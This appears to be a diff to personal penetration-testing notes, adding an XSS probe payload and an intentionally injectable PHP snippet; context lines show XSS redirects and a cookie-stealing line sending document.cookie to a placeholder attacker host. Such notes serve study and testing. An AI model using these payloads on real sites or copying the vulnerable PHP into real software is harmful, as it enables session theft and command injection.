@@ -247,6 +247,7 @@ Other better ones are
 <plaintext>
 <script>alert(window.origin)</script>
 <img src=x onerror="windows.location.href="http://<otherwebpage>/">
+<img src=x onerror="prompt(1)">
 ```
 To verify code has been ran successfully:
 1. See output in browser window (popup, new text )
@@ -371,6 +372,8 @@ new Image().src='http://OUR_IP/index.php?c='+document.cookie
 <script src=http://OUR_IP/script.js></script>
 ```
 
+
+
 Our PHP code to steal the cookie
 ```
 <?php
@@ -391,6 +394,15 @@ if (isset($_GET['c'])) {
 
 ---
 ## Command Injection
+Basic PHP command inject
+```php
+<?php
+if (isset($_GET['filename'])) {
+    system("touch /tmp/" . $_GET['filename'] . ".pdf");
+}
+?>
+```
+
 **Blind**
 **Out-of-Band**
 
